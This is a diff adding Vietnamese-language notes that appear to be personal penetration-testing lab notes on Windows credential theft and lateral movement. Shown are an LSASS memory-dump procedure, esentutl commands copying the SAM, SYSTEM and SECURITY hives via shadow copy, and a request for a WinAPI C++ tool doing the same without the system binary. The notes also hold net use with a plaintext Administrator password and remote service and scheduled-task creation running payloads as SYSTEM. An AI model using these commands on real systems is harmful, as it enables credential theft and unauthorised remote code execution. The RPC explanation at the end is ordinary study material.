@@ -15,3 +15,84 @@ Luồng:
 3. Mở handle tới lsass.exe
 4. Tạo file dump (File này sẽ chứa snapshot bộ nhớ của lsass tại thời điểm dump)
 5. Dump bộ nhớ bằng MiniDumpWriteDump
+
+
+
+
+esentutl.exe /y /vss c:\windows\system32\config\SAM /d c:\windows\temp\SAM
+esentutl.exe /y /vss c:\windows\system32\config\SYSTEM /d c:\windows\temp\SYSTEM
+esentutl.exe /y /vss c:\windows\system32\config\SECURITY /d c:\windows\temp\SECURITY
+
+Cho tôi một chương trình C++ có chức năng tương tự như trên.
+Được viết hoàn toàn bằng WinAPI hay hàm từ Windows.
+Cốt lõi tôi muốn thực hiện hành động nhưng không dùng binary đó (có thể có trên hệ thống này nhưng không có trên hệ thống khác hoặc khác version) để khởi tạo tiến trình, mục đích sử dụng code chương trình để thực hiện cốt lõi Windows.
+
+VSS_PWSZ
+
+vss_copy.exe C:\Windows\System32\config\SAM C:\Windows\Temp\SAM C:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM C:\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY
+
+net use \\192.168.47.136\IPC$ /user:Administrator P@ssw0rd123
+sc.exe \\192.168.47.136 create FakeService binpath= "C:\Users\wintest\Desktop\service.exe" start= auto
+sc.exe \\192.168.47.136 start FakeService
+sc.exe \\192.168.47.136 delete FakeService
+
+sc.exe \\192.168.47.136 create FakeService binpath= "C:\Users\wintest\Desktop\cmd.exe" start= auto
+
+schtasks /s 192.168.47.136 /RU "SYSTEM" /create /tn "MyTask" /tr "C:\Users\wintest\Desktop\cmd.exe" /sc ONCE /sd 01/01/1970 /st 00:00
+
+win10test
+192.168.47.176
+
+win-test
+192.168.47.136
+
+net use \\192.168.47.136\IPC$ /user:Administrator P@ssw0rd123
+sc.exe \\192.168.47.136 start FakeService
+
+* Cách xóa kết nối IPC$
+net use \\192.168.47.136\IPC$ /delete
+net use \\192.168.47.136\IPC$ /del
+* Cách xóa toàn bộ các kết nối SMB hiện tại
+net use * /delete
+
+
+
+schtasks /s 192.168.47.136 /RU "SYSTEM" /create /tn "MyTask" /tr "C:\Users\wintest\Desktop\service.exe" /sc ONCE /sd 01/01/1970 /st 00:00
+schtasks /s 192.168.47.136 /run /tn "MyTask"
+Delete the task
+schtasks /s 192.168.47.136 /tn "MyTask" /DELETE /F
+
+- Đầu tiên sử dụng "net use" để tạo một session SMB.
+
+
+1. net use → tạo SMB session
+2. sc.exe → gọi RPC tới Service Control Manager
+3. SCM kiểm tra:
+- Bạn có phải admin không?
+4. Nếu đúng → CreateService() thành công
+
+* RPC
+RPC là viết tắt của Remote Procedure Call — nghĩa là: Gọi một hàm (procedure) trên một máy khác giống như đang gọi hàm cục bộ.
+
+sc.exe → RPC client → gửi request qua network → RPC server trên máy remote → Service Control Manager thực thi CreateService()
+=> RPC chính là “người vận chuyển lời gọi hàm qua mạng”.
+
+Những dịch vụ Windows chạy qua RPC:
+- Service Control Manager
+- WMI
+- Remote Registry
+- DCOM
+- Task Scheduler
+- LSASS (một phần)
+- Active Directory
+
+
+sc.exe
+   ↓
+RPC client library (rpcrt4.dll)
+   ↓
+SMB / Named Pipe (\pipe\svcctl)
+   ↓
+RPC endpoint của Service Control Manager
+   ↓
+SCM thực thi CreateServiceW()
